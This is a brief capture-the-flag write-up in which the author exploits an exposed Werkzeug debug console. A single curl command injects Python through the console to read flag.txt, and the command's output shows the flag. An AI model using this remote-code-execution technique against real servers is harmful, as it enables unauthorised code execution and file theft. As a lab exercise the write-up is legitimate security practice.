Werkzeug debug is open, seems to return a lot of 404s, but just keep repeating the request till it works...

```
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl -G 'http://jh2i.com:50018/console' --data-urlencode '__debugger__=yes' --data-urlencode 'cmd=print(open("flag.txt", "r").read())' --data-urlencode 'frm=0' --data-urlencode 's=2wXjuMqy4oKzUIktlY78'
>>> print(open(&quot;flag.txt&quot;, &quot;r&quot;).read())
flag{weurkzerg_the_worst_kind_of_debug}
```